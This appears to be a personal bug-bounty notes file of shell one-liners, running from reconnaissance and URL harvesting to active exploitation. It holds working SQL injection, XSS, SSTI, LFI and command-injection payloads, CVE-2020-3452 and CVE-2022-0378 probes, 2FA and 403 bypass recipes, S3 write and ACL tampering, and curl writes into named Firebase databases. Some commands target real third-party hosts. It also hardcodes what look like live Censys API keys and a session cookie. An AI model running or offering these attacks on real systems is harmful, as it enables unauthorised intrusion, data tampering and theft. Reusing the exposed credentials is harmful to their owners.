katana -list httpx -o urls-katana -jc -dr -d 4 -em 7z,7zip,accdb,backup,bak,cache,class,cfg,conf,config,css,crt,csv,csr,db,db3,dbf,doc,docx,ear,js,env,gitignore,dmg,gz,ini,jar,java,json,key,log,md,md5,mdb,pdf,pem,pl,plist,pptx,p12,rpm,py,properties,rar,exe,secret,dll,sh,sql,sqlcipher,sqlitedb,sqlite3,action,adr,ascx,asmx,axd,bkf,iso,bkp,asc,pub,msi,bok,achee,cfm,cnf,lst,mai,mbox,mbx,nsf,ora,pac,passwd,pcf,pgp,rdp,reg,rtf,skr,tpl,url,deb,wml,bat,xsd,tar,bin,tar.gz,tgz,txt,war,xls,xlsx,xml,xz,yaml,yml,swp,tmp,htm,img,zip,lock,aspx,asp,html,inc,php,old,jsp,cgi,jku,jwk,jks,jwt
cat httpx | hakrawler 2>/dev/null | tee -a urls-hakrawler || true
waymore -n -i wildcards -oU urls-waymore -mode U
gospider -S httpx -o urls-gospider --sitemap --robots -a --no-redirect -q --blacklist "\.(ico|svg|woff|ttf|list|png|jpg|gif)$" && cd urls-gospider && cat * >> urls-gospidy && mv urls-gospidy ../ && cd .. && rm -r urls-gospider && sed -i '/\[subdomains\] -/d; s/.*\(https\?:\/\/[^ ]*\).*/\1/' urls-gospidy
while read -r domain; do paramspider -d "$domain"; done < httpx-noproto 
paramspider -l httpx-noproto
cat httpx | waybackurls -no-subs | tee -a urls-wayback
waybackurls exampl.com >> urls.txt

cat urls-* | anew | uro | tee -a urlss && grep -Ev '\.(png|jpeg|woff2|svg|css)(\?|$)' urlss > allurls && rm urlss && cat allurls | awk -F'[?&]' '{key=$1; for(i=2;i<=NF;i++){split($i,a,"="); key=key "&" a[1]}; if(!seen[key]++){print $0}}' | tee -a urls && mv urls-* allurls done

#clean for alien subs urls
--------------------------
awk -F/ 'NR==FNR{domains[$1]; next} {host=$3; sub(/:.*/,"",host); matched=0; for(d in domains) if(host==d || host ~ ("\\."d"$")) {matched=1; break} if(matched) print > "urls_allowed.txt"; else print > "urls_rejected.txt"}' wildcards urls && mv urls done && mv urls_allowed.txt urls
cat urls | grep "=eyJ" | sort -u >> eyJ
cat urls | grep -iE 'admin|internal|dashboard' > admin
grep -Eo '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' urls | sort -u > emails

mkdir extensions && cd extensions && cat ../urls | grep -Eo 'https?://[^ ]+\.(0|1|2|7z|7zip|accdb|action|adr|ar|arc|asc|ashx|asmx|asp|aspx|axaml|axd|bak|bak1|bakup|bakup1|backup|back|bat|bac|bck|bin|bk|bkp|bkf|bok|bowerrc|bz2|cache|cbz|cfm|cgi|class|clj|cnf|conf|config|copy|cookie|crt|cs|csproj|csr|csv|cvsignore|db|db3|dbf|deb|default|dmp|dof|doc|docx|docker-compose\.yml|dockerfile|dockerignore|ds_store|DS_Store|dmg|dump|ear|edn|enc|env|env\.local|env\.prod|env\.dev|env\.test|env\.example|env\.sample|env\.development|env\.production|env\.staging|env\.backup|env\.old|env\.save|env\.tmp|env\.temp|env\.log|env\.json|env\.yaml|env\.xml|env\.conf|env\.cfg|env\.settings|env\.secret|env\.keys|env\.credentials|env\.tokens|env\.api|env\.database|env\.mysql|env\.postgres|env\.redis|env\.mongo|env\.aws|env\.s3|env\.gcp|env\.azure|env\.docker|env\.k8s|env\.vault|eslintrc|eslintignore|exe|git|gitignore|gitconfig|gitmodules|gitattributes|gitkeep|gitlab-ci\.yml|gz|hcl|htaccess|htaccess\.bak|htaccess\.old|htaccess\.backup|htaccess\.save|htaccess\.tmp|htaccess\.temp|htaccess\.log|htaccess\.json|htaccess\.yaml|htaccess\.xml|htaccess\.conf|htaccess\.cfg|htaccess\.settings|htaccess\.secret|htdigest|htgroup|htpasswd|htpasswds|htdbm|html|htm|ica|idea|img|inc|include|ini|iso|jar|java|js|js\.map|jku|jwk|jks|jsp|json|jwt|key|k8s|lock|log|lst|lzma|mai|map|mbox|mbx|mdb|md|md5|msi|nsf|netrc|npmrc|nsx|old|ora|org|orig|original|pac|passwd|pcf|pem|pgp|php|plist|pl|pptx|ppk|prettierrc|prettierignore|properties|pub|py|rake|rar|rdp|reg|rpm|rtf|sav|save|saved|secret|sh|sls|spec|sql|sqlcipher|sqlitedb|sqlite3|sql\.gz|swp|swo|tar|tar\.7z|tar\.bz2|tar\.gz|tar\.lzma|tar\.xz|tgz|tfstate|tfvars|tmp|temp|tpl|toml|travis\.yml|tugboat|txt|url|vb|vscode|war|wim|wml|xls|xlsx|xml|xz|yaml|yml|yarnrc|zip)(\?|$)' | while read -r url; do ext="${url##*.}"; ext="${ext%%\?*}"; echo "$url" >> "$ext"; done && cat ../jsfiles.txt >> js && cat js | anew >> jss && rm js && mv jss js && cd .. && mv jsfiles.txt done
cd extensions && for f in *; do [ -f "$f" ] && httpx -l "$f" -o "${f}-alive"; done && cd ..

#extract endpoints and params from js files
total=$(wc -l < extensions/js-alive); i=0; while read -r url; do i=$((i+1)); content=$(curl -s "$url"); echo "$content" | grep -oE '/[a-zA-Z0-9_/\.-]+(\?[a-zA-Z0-9_=&%-]*)?' | sed 's/\?.*$//' | sed -E 's/\.[a-zA-Z0-9]+$//' | anew endpoints.txt >/dev/null; echo "$content" | grep -oE '/[a-zA-Z0-9_/\.-]+\?[a-zA-Z0-9_=&%-]+' | sed 's/.*?//' | tr '&' '\n' | cut -d= -f1 | anew parameters.txt >/dev/null; printf "\r[%d/%d] %d%%" "$i" "$total" "$((i*100/total))"; done < extensions/js-alive; echo
#extract endpoints from urls file (from extensions and endpoints)
awk -F/ '{p=""; for(i=4;i<NF;i++){p=p "/" $i} if(length(p)==0 && NF>3) p="/"; else if(length(p)>0 && substr(p,1,1)!="/") p="/" p; if(length(p)>0){gsub(/[:;%$&*()[\]{}]/,"",p); print p}}' urls | sed '/^$/d' | anew >> endpoints.txt

#params from urls
cat urls | grep '?' | sed 's/.*?//' | tr '&' '\n' | cut -d'=' -f1 | anew | tee -a params
#takes too long and gives too many >> may avoid

cat extensions/js | while read url; do vars=$(curl -s "$url" | grep -Eo "var [a-zA-Z0-9_]+" | sed 's/^var //' | grep -v '.js' | grep -Ev '^[a-zA-Z]$'); [ -n "$vars" ] && echo "$vars" | tee -a params; done
cat ~/parameters.txt >> params && cat parameters.txt >> params 
cat params | anew >> parameters && mv params done && mv parameters.txt done

#strip urls off of params
sed 's/[?].*//' urls | tee -a deparameterized

#cleaning endpoints from dom.js
sed -E 's/\/[^\/]+\.[a-zA-Z0-9]+$//' endpoints.txt | sed -E 's/([^\?&#]+)(\?.*|#.*)?/\1/' | sed 's:/$::' | grep -v '^$' | anew >> endpoints && mv endpoints.txt done

#merging alive subs with found enpoints.txt
cat httpx | while read -r url; do echo "Results for $url" | tee -a finalendpoints0; ffuf -u "$url/FUZZ" -w endpoints -fs 0 -mc 200 -timeout 5 -ac | uniffuf | tee -a finalendpoints0; echo "--------------------------------------" | tee -a finalendpoints0; done && awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' finalendpoints0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > finalendpoints

#parameters
grep -E '\.(php|asp|aspx|jsp|py|rb|pl|cgi|do|action|ashx)(\?|#|$)' urls | sed -E 's/([^\?&#]+)(\?.*|#.*)?/\1/' | httpx -silent | tee -a extendedUrls
cat extendedUrls httpx finalendpoints >> phase1

#ffufing for params
while read url; do echo "=== Testing $url ==="; baseline=$(curl -s -o /dev/null -w "%{size_download}" "${url}?dummyparam=123"); echo "Results for $url" | tee -a phase2; ffuf -u "${url}?FUZZ=1" -w parameters -fs "$baseline" -timeout 5 -ac | uniffuf | tee -a phase2; echo "--------------------------------------" | tee -a phase2; done < phase1

#cleaning ffuf output
awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(length(ep)>0) out=out ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' phase2 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "?" $0 "=1"}}' | anew >> parameterizedUrls

#.js.map
mkdir jsmap && cd jsmap && while read -r url; do name=$(basename "$url" .js.map); sourcemapper -output "$name" -url "$url"; done < ../extensions/js.map-alive
while read -r url; do name=$(basename "$url" .js); sourcemapper -output "$name" -jsurl "$url"; done < ../extensions/js-alive; cd ..

---------------------------------------------------------------------------------------------------------------------------------------------------

new:-
-----
sed 's/$/?__proto%5Btestparam%5D=exploit/' httpx | page-fetch -j 'new URL(location).searchParams.get("__proto__[testparam]")==="exploit" ? "[VULNERABLE]" : "[NOTVULNERABLE]"' 2>/dev/null | grep '\[VULNERABLE\]' | tee -a parampollution
#BXSS
bxsser parameterizedUrls
#OR
cat parameterizedUrls | qsreplace "https://evil.com" | httpx -fr -mr "evil.com" | tee -a openredirect      #payloads
#SQLI
cat parameterizedUrls | while read -r url; do     echo "Results for $url" | tee -a sqli;     ffuf -u "${url%%=*}?${url#*=}=FUZZ" -w ~/sqlipayload -fs 0 -s "error\|syntax\|MySQL\|SQLSTATE\|ODBC\|PostgreSQL\|incorrect syntax\|Warning: mysql_fetch_array\|invalid query\|Fatal error\|error in your SQL syntax\|Query failed" -t 50 | tee -a sqli;     echo "--------------------------------------" | tee -a sqli; done
#XSS
cat parameterizedUrls | grep "\?" | qsreplace '"><script>alert(1447)></script>' | airixss 'alert(1447)' | grep -v "Not" | tee -a xss
#NUCLEI
nuclei -l httpx -tags swagger -rl 50 | tee -a nuclei-swagger
nuclei -l httpx -o nuclei-httpx -s low,medium,high,critical -rl 50
nuclei -l parameterizedUrls -dast -o nuclei-dast -s low,medium,high,critical -rl 50
nuclei -l ips -s medium,high,critical

CVE-2020-3452:-
while read LINE; do curl -s -k "$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[VULNERABLE] $LINE" | tee -a CVE-2020-3452; done < httpx

CVE-2022-0378:-
cat httpx | while read h; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x" | grep -qs "onmouse" && echo "$h: VULNERABLE" | tee -a CVE-2022-0378; done

Extract Endpoints from swagger.json:-
-------------------------------------
cat httpx | while read -r url; do echo "Results for $url" | tee -a swaggerjson0; ffuf -u "$url/FUZZ" -w ~/wordlists/swaggerjson -fs 0 -mc 200 -timeout 5 -ac | uniffuf | tee -a swaggerjson0; echo "--------------------------------------" | tee -a swaggerjson0; done && awk '/^Results for / {url=$3; out=""; next} /^[[:space:]]*[-]+$/ {if(out!=""){sub(/\n$/,"",out); print url "\n" out} url=""; out=""; next} NF && url {ep=$1; gsub(/\x1B\[[0-9;]*[a-zA-Z]/,"",ep); gsub(/\r/,"",ep); if(ep ~ /^\//) out=out ep "\n"; else out=out "/" ep "\n"} END {if(out!=""){sub(/\n$/,"",out); print url "\n" out}}' swaggerjson0 | awk '{gsub(/^[ \t]+|[ \t]+$/,""); if($0 ~ /^https?:\/\//){url_num=NR; last_url_num=url_num; url_map[url_num]=$0} else if(length($0)>0){print url_map[last_url_num] "/" $0}}' | sed 's#\([^:]\)/\+#\1/#g' > swaggerjson
while read url; do echo "$url"; curl -s "$url" | jq -r '.paths | keys[]'; echo "----------------------------------------"; done < swaggerjson > swaggerjsonSecrets && mv swaggerjson swaggerjson0 done

lfimap:-
lfimap -F parameterizedUrls -a | tee -a lfi-results0 && cat lfi-results0 | grep -E "\[\+\]" | tee -a lfi-results && rm lfi-results0

misc:-
cat httpx-info | grep IIS | tee -a IIS && sed -i 's/ .*//' IIS && for url in $(cat IIS); do shortscan -F $url | tee -a IIS-scanned; done && mv IIS done

grafana scan:-
grafana_scanner -u https://grafana.example.com // or -f file

xss urls && SQLi:-
cat allurls | grep "\?" | qsreplace "X" | tee -a sqli && sqlmap -m sqli --batch --random-agent --level=1 --risk=1 tamper=between,space2comment | tee -a sqli-output

cat urls | dalfox pipe --skip-bav --skip-mining-all --skip-grepping -o dalfox
cat allurls | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/' | tee -a XSS
cat urls | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/' | tee -a XSS

urls from sitemap:-
while read domain; do echo "[+] Fetching sitemap for $domain"; curl -s "$domain/sitemap.xml" | xmllint --format - 2>/dev/null | grep -oP '(?<=<loc>).*?(?=</loc>)'; done < domains.txt

Virtual hosts:-
ffuf -u 'https://example.com' -H 'Host: FUZZ.example.com' -w DNS/top-1million-11.txt
ffuf -u http://93.184.216.34 -H "Host: FUZZ.example.com" -w DNS/top-1million-11.txt
for domain in $(cat wildcards); do echo "***results for $domain " | tee -a vhosts; ffuf -u "https://$domain" -H "Host: FUZZ.$domain" -w ~/wordlists/best-dns-wordlist.txt -mc 200 -x socks5://127.0.0.1:9050 | tee -a vhosts; done
# if many outputs with the same size ex: 4517 then filter that size with -fs after that you can go to subdomain from vhost but not working like add the subdomain you found to /etc/hosts this subdomain indicates to the main domain ip for ex: ffuf.me => 138.68.165.164 => 138.68.165.164	redhat.ffuf.me		#now subdomain is accessible on browser

CIDR:-
------
PortscanningL
masscan 1.2.3.4/24 -p 1-65535 –exclude 255.255.255.255 –rate 100000 –output-format json –output-filename scan-results.json
Parsing masscan results:
cat scan-results.json | sed -e ‘/^\[/d’ -e ‘/^\]/d’ -e ‘s/,$//’ | jq -r ‘[.ip, .ports[0].port] | @tsv’ | sed ‘s/\t/:/’ | sort -u > masscan-cidr && rm scan-results.json
find the right subdomain that points to that IP:
cat ips | hakip2host
crobat -r 2.3.4.5
dirsearch --cidr=CIDR --max-rate=2			# max requests per second

cors checker:-
--------------
cat urls | while read url; do resp=$(curl -s -I -H "Origin: https://evil.com" "$url"); echo "$resp" | grep -q "Access-Control-Allow-Origin: https://evil.com" && echo "$resp" | grep -q "Access-Control-Allow-Credentials: true" && echo "[CORS Vulnerable] $url" | tee -a cors.txt; done

Amazon s3 buckets:-
-------------------
awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto
grep -E '^[a-zA-Z0-9.-]+$' httpx-noproto | awk 'length <= 253' | grep -v '^[0-9.-]' | while read domain; do echo "$domain"; done | dig -f - +short | grep -E '\.s3(-website)?[.-]' | tee -a s3

open redirect:-
---------------
1. awk '{gsub(/https?:\/\//, ""); print}' httpx >> httpx-noproto
2. python3 ~/tools/Oralyzer/oralyzer.py -l httpx-noproto -p /root/tools/Oralyzer/payloads.txt | tee -a oralyzer-httpx-noproto.txt
3. grep -oP '(http|https)://\S+' oralyzer-httpx-noproto.txt  > oralyzer.txt && rm oralyzer-httpx-noproto.txt
4. cat oralyzer.txt | httpx -o oralyzer-alive.txt
oralyzer -u example.com

JS exploitation:-
-----------------
grep -i '\.js' allurls | sed -E 's/(\.js).*/\1/i' >> js.txt
cat js.txt | mantra | tee -a mantra		#hunt down API key leaks in JS files and pages
python3 ~/tools/LinkFinder/linkfinder.py -h
cat httpx | while read url; do python3 ~/tools/SecretFinder/secretfinder.py -i $url -e -g 'jquery;bootstrap;api.google.com' -o cli >> js-secretfinder; done
nuclei -l URLS/js.txt -t ~/nuclei-templates/http/exposures/ -mhe 4 | tee -a nuclei-js
cat URLS/js.txt | jsluice urls | tee -a jsluice-urls
cat URLS/js.txt | jsluice secrets | tee -a jsluice-secrets
getjs -url https://destroy.ai		or        curl https://destroy.ai | getjs
while IFS= read -r link; do wget "$link"; done < ../URLS/js200.txt		# download js files:
jsluice urls player.js
jsluice secrets player.js
# Extracts JavaScript files from URLs for analysis.
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret" /path/to/directory/*.js

PHP exploitation:-
------------------
grep -i '\.php' allurls | sed -E 's/(\.php).*/\1/i' >> php.txt && while read url; do arjun -u "$url" -oT "$(echo $url | sed 's|https\?://||;s|/|_|g').txt" -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0" -o "$(echo $url | sed 's|https\?://||;s|/|_|g')_params.json"; done < php.txt

then exploit:
sqlmap -u "https://example.com/file.php?id=1&name=abc&xor=1"		# gather all found params SQLi
https://example.com/file.php?id=1' or sleep(100);-- -
https://example.com/file.php?action=<svg/onload=confirm()>		# XSS
https://example.com/file.php?action={{5*5}}		# SSTI
https://example.com/file.php?filename=../../../../etc/passwd		#LFI
https://example.com/file.php?filename=file.txt;whoami		# command injection
php could also be used to file upload leading to RCE
if there is a site running php, check php version and look for exploits
sqlmap -u "https://portal.interworx.com/clientarea.php?id=*"
sqlmap -u "https://portal.interworx.com/clientarea.php?id=*" --risk 3 --level 5 --random-agent --banner --batch --dbs --ignore-code 403 --tamper=space2comment.py,randomcase.py
sqlmap  -r request.txt  --batch --random-agent --tamper=space2comment,randomcase --drop-set-cookie --banner --threads 10 --dbs
ghauri -u "https://ex.service.example.com/history?selectedSources=someSources" --dbms=postgres --cookie="JSESSIONID=09326D266052B6B0F7E391B7BBD3A284" --dbs

Request smuggling:-
-------------------
cat httpx | python3 ~/tools/smuggler/smuggler.py | tee -a smuggler

Find origin IPs:-
-----------------
python3 cloakquest3r.py www.pepsico.com
method1
ssl.cert.subject.CN:”*.dropbox.com” 200			# shodan search
method2
1. https://favicons.teamtailor-cdn.com/            # to get the favicon url using the domain
2. https://favicon-hash.kmsec.uk/                # using the favicon url we can get the hash and search shodan

while IFS= read -r domain; do censys search "$domain" | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d '\"' | tr -d ',' >> ips-origin; done < domains
censys search hackerone.com
censys search hackerone.com | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d \"\, | tee -a ips
censys search hackerone.com | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d \"\, | httpx
httpx -auth		#to add API key and activate board
cat ips.txt | httpx -dashboard
Ssl.cert.subject.CN:"pepsico.com" 200		# on shodan website

You have an Origin IP but it does not render the webpage, what to do?
>> Check for open ports on all ports (65535) using TCP, UDP, and SCTP protocols.

# Impact:
An attacker can bypass Cloudflare protection and perform malicious actions. Cloudflare bypasses can have a significant impact, as any adversary is now able to communicate directly with the origin server, enabling them to execute unfiltered attacks (such as Denial-Of-Service, SQLi, etc.) and retrieve other sensitive data.
# Once you sign up or any email received from the targeted website then endeavour the below method
>> more > Show Original > search (Ctrl + f ) “Received”
>> It may reveal the Origin IP, sometime it will be used for 403 bypasses.

# for cloudflare bypass
python3 -m venv venv			# while in root directory
source ~/venv/bin/activate		# and $deactivate after you finish
export CENSYS_API_ID=e5500834-3336-450d-856d-95f7f9547655
export CENSYS_API_SECRET=Dyk6F9QYhoct6kVJTxVVeKkgiDn0FSnu
cloudflair.py example.com

Exiftool metadata:-
-------------------
go-dork -q "inurl:'...'"
go-dork -e bing -q ".php?id="
go-dork -q "intext:'jira'" -p 5	#default is first page, but this sequential from page 1 - 5
go-dork -q "org:'Target' http.favicon.hash:116323821"
go-dorkhttps://payments.latitudefinancial.com/ -q “site:*.facebook.com filetype:pdf” -p 10 | grep .pdf | anew download.txt
	xargs -n1 curl --remote-name < download.txt
exiftool <file>

1. visit example.com and upload and image.
2. right-click the image and download it.
3. check the image for sensitive data on https://jimpl.com/

>> upload a pic and then see if it still has info like geo location as this should be deleted once uploaded 

AWS_buckets:-
-------------
#If you find an ACCESS_KEY and SECRET_KEY in js test them with:
python3 tools/enumerate-iam-master/enumerate-iam.py

enumeration:
s3scanner -bucket-file domains.txt/subdomains.txt/httpx		# enumerate buckets. no http:// or https:// 
s3scanner -bucket flaws.cloud
s3scanner -provider gcp -bucket my-bucket
s3enum -wordlist ~/wordlists/s3enumwordlist.txt -suffixlist ~/wordlists/s3enumsuffix.txt -threads 10 hackerone
ruby ~/tools/lazys3/lazys3.rb <COMPANY> 
Let's say you were researching "somecompany" whose website is "somecompany.io" that makes a product called "blockchaindoohickey". You could run the tool like this:
~/tools/cloud_enum/cloud_enum.py -k somecompany -k somecompany.io -k blockchaindoohickey
nuclei

dig CNAME example.com	if=>	xxx.s3.amazonaws.com

Testing for misconfigured list permissions in AWS S3
aws s3 ls s3://flaws.cloud/ --no-sign-request
Testing for misconfigured read permissions in AWS S3
aws s3api get-object --bucket flaws.cloud --key robots.txt ./output --no-sign-request
Testing for misconfigured download permissions in AWS S3
aws s3 cp s3://flaws.cloud/robots.txt ./ --no-sign-request
aws s3 cp s3://docs-dev.baas.fuze.com/citadel/ ./citadel/ --recursive --no-sign-request

Testing for misconfigured write permissions in AWS S3
aws s3 cp randomfile.txt s3://flaws.cloud/robots.txt --no-sign-request
Testing for read permissions on Access Control Lists (ACLs)
aws s3api get-bucket-acl --bucket flaws.cloud --no-sign-request
Testing for write permissions on Access Control Lists (ACLs)
aws s3api put-bucket-acl --bucket {BUCKET_NAME} --grant-full-control emailaddress={EMAIL} --no-sign-request
Testing for S3 versioning
aws s3api get-bucket-versioning --bucket flaws.cloud --no-sign-request
dump files from bucket
s3scanner dump -bucket flaws.cloud --dump-dir $(pwd)

>> aws s3 mb s3://files-dev.target.com  >> aws s3 subdomain takeover

Cloud
https://kaeferjaeger.gay/


XSS:-
-----
>> copy all of xss.report payloads for bxss :)
cat urls | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/' | tee -a XSS
echo "testphp.vulnweb.com" | waybackurls | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/'
echo "testphp.vulnweb.com" | gau | grep "?" | qsreplace 'xssz\"><img/src=x onerror=confirm(999)><!--' | httpx -mr '\"><img/'

cat domains | waybackurls | gf xss | tee -a gf-xss.txt
cat domains | gau | gf xss | tee -a gf-xss.txt
cat gf_xss.txt xss_urls.txt | qsreplace ‘“><script>alert(1447)></script>’ | airixss ‘alert(1447)’ | grep -v “Not”

xsscrapy.py -u http://example.com
python3 ~/tools/XSStrike/xsstrike.py -u "http://testphp.vulnweb.com/" --crawl -t 10
while IFS= read -r url; do python3 ~/tools/XSStrike/xsstrike.py -u "$url" --crawl -t 10 >> xsstrike.txt; done < urls
for x in $(cat httpx); do xsstrike -u $x --crawl -t 10 | tee -a xsstrike; done
# dalfox also finds openredirects ans sql without running kxss
# params is from paramspider
sed 's/=.*/=/' params >> dalfox	# extracts urls with params and removes anything after the = sign
cat dalfox | dalfox pipe --waf-evasion -o dalfox.txt
dalfox file urls.txt --skip-xss-scanning -o reflecting.txt
echo "https://www.**********.***/event_register.php?event=177" | kxss		# show unfiltered char in param
dalfox file urls.txt --skip-xss-scanning -o reflecting.txt

firebase exploit if .json file returns null, then it's vulnerable
cd ~/tools/firebaseExploiter && ./firebaseExploiter -exploit -file domains/subdomains

download android app, then use apk extractor
java -jar ~/tools/apktool.jar d Dropbox.apk -o outputDIR
gedit res/values/strings.xml
firebaseExploiter -url https://dropbox-com-avian-chariot-819.firebaseio.com
firebaseExploiter -url https://dropbox-com-avian-chariot-819.firebaseio.com -exploit
curl -X POST https://agua-e6f2c-default-rtdb.firebaseio.com/.json -d '{"Hacked":"OhMyLulu"}' -H "Content-Type: application/json"
curl "https://veertly-aurora.firebaseio.com/poc1.json" -XPUT -d '{"attacker":"maliciousdata"}'
fireExploit.py			# if you have API and auth domain from res/values/strings.xml - run venv

exploit firebase if /.json returns null
https://danangtriatmaja.medium.com/firebase-database-takover-b7929bbb62e1
https://hackerone.com/reports/736283

CRLF:-
------
crlfsuite -iT httpx | tee -a crlf-httpx

CORS:-
------
python3 ~/tools/corsy/corsy.py -i httpx | tee -a corsy-httpx
python3 ~/tools/corsy/corsy.py -i urls | tee -a corsy-urls
python3 ~/tools/Corsy/corsy.py -u https://example.com
cors_scan.py -i urls/subdomains/domains
cors_scan.py -u example.com

SSRF:-
------
~/mytools/SSRFmap$ ./ssrfmap.py -r req.txt -m readfiles -p "pdf_path"			# venv only

zone transfer:-
---------------
zoner.sh -d zonetransfer.me
zoner.sh -l file_of_domains

shodan:-
--------
"Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7" >> RCE
./emulateIE7 173.225.247.212			#should get passwd file content >> research this as it might not find the file passwd

censys:-
--------
censys config		# to configure creds
virustotal > example.com > details > copy JARM fingerprint > search it on censys

email:-
-------
nslookup -type=txt example.com
nslookup -type=txt _dmarc.example.com

BLH:-
-----
while read -r domain; do python3 ~/tools/BrokenLinkHijacker/BLH.py "https://$domain" -d 3 -o; done < ../wildcards
https://edoverflow.com/2017/broken-link-hijacking/

ldap port 389:
--------------
ldapsearch -x -H ldap://94.130.205.78:389 -s base

DS_Store:
---------
python ds_store_exp.py http://www.example.com/.DS_Store

Others:-
--------
user enumeration with sitemap.xml:-
./sitemap-user-enum
python3 mytools/loxs/loxs.py			# find LFI SQLI XSS CRLF OR
git-dumper https://example.com/.git output/			# get git stuff and source code
XSS-LOADER$ python3 payloader.py
sitemapper.py 		# exploit sitemaps
./tools/GitTools/Dumper/gitdumper.sh https://domain.com/.git/ hack_data		>> cd hack_data >> git log
Emails
./tools/DMARC-SPF-Checker/mailwatch.py
./tools/DMARC-SPF-Checker/python_email_sender.py		# configure this
google API
gcloud init
gcloud auth activate-service-account --key-file=key.json
gcloud projects list
gcloud compute instances list
gsutil ls
# Returned: gs://target-prod-logs/
gsutil cp gs://target-prod-logs/internal-access.log .

File_Name_Vulnerability:-
------------------------
Path Traversals >> ../../../tmp/lol.png
SQL >> Injection: sleep(10) — -.jpg
XSS >> <svg onload=alert(document.comain)>.jpg/png
Command Injection >> ; sleep 10;.jpg
DOS >> Rename your file to a long string and upload, It may cause DOS.

Tips:-
------
-- check icons on the website like socials >> if one doesn't work, report it
-- sourcecode review
-- if a page doesn't have captcha, the hacker could send endless requests

-- in sign up forms we can try html injection like <u>hossam<u> >> if we receive the email with hossam underlined, then it's an html injection.
-- imperva firewall bypass
-- burpsuite method fuzzer:  intruder >> add marks on GET > simplelist > choose list web verbs
-- if page return "secure connection failes" >> use http instead of https
-- 403 bypass:
	# bypass403 https://example.com
	# nomore403
	# 403-bypass.sh -u https://example.com --exploit
	# burp >> param miner - 403 bypasser
--try to fuzz the ip instead of domain or sub, sometimes it has more info:
	ffuf -u http://10.10.10.10/FUZZ	or	 dirsearch -u http://10.10.10.10
--if there is 404 website > use dig and check if there is a CNAME
--nosqli tool
--sometimes headers or parameters are hidden, so we use param miner
--response manipulation while loggin in.
--while manually checking pages > check static pages quickly and focus on pages with accounts.
--if some info on an account is dimmed and can't be changed, try to remove the disabling of them from inspect.
--if account runs http and not https, then it's a vuln, specially login pages
--try default creds on login pages
--try to inject sql injection in username as admin' or 1=1; -- -
--try to make response manipulation to bypass login page by changing the response itself.
--use the request and send it to sqlmap to test if there is sql injection or not > request.txt
--try to inject template injection inside username as {{9*9}} and if printed 81 then vulnerable to template injection
--view source code of the page from CTRL+U to see if leaked credentials
--2fa
	1- 000000 - 123456
	2- replace random numbers with “null” in burp request interception
    3- reuse previous OTP
	4- use code of another account, so both are waiting with a code but switch them.
	5- No rate limit on 2FA	=>> burpsuite intruder
	6- check if the code sent is exposed in response
	7- bypass it by reset password link
		- enable 2fa 
		- logout 
		- reset password => then click on the link 
		- if you got into directly then vulnerability 

	8- bypass it by Oauth google 	=> 2fa 
		1- login 
		2- enable 2fa 
		3- login with google => if you got into directly then (vulnerability) 

	11- No rate limit on sending 2FA 
	10- response manipulation => 403 Forbidden => 200 OK 
				false => true
				0 => 1
				failed => successful 
	11- bypass 2fa by the next step in the link
		/login > /2fa > /account
		/login > /account
	12- enable 2fa without email verification lead to pre-account takeover
	13- enabling 2fa does not end another sessions		>	change password 
-- exploit .git 	GitHacker tool - gitgrabber
-- dns rebinding: https://lock.cmpxchg8b.com/rebinder.html
-- CSP bypass search: https://cspbypass.com/

## find subdomains from the cloud providers:
-----------------------------------------
# I have downloaded all of them in: ip-ranges
cat ip-ranges | grep -oP ‘[a-z0–9]+\.[a-z]+\.[a-z]+’ | grep yourtarget | sort -u
cat domains | xargs -I {} grep -oP "[a-z0-9]+\.[a-z]+\.[a-z]+" ~/ip-ranges  | grep -F "{}" | sort -u
